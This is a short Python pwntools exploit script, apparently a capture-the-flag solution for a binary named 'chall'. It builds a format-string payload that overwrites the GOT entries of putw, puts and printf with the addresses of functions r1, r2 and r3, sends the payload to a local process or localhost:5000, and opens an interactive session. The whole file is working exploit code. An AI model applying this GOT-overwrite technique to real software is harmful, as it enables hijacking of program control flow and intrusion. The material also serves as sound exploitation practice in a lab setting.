#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin/chall")
# lib = ELF("./bin/libfmtstr.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path], env={"LD_LIBRARY_PATH": "./bin"})
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 5000)

    return r


def main():
    r = conn()

    payload = fmtstr_payload(6, {
        exe.got['putw']: exe.sym['r1'],
        exe.got['puts']: exe.sym['r2'],
        exe.got['printf']: exe.sym['r3'],
    })

    print(payload, len(payload))

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
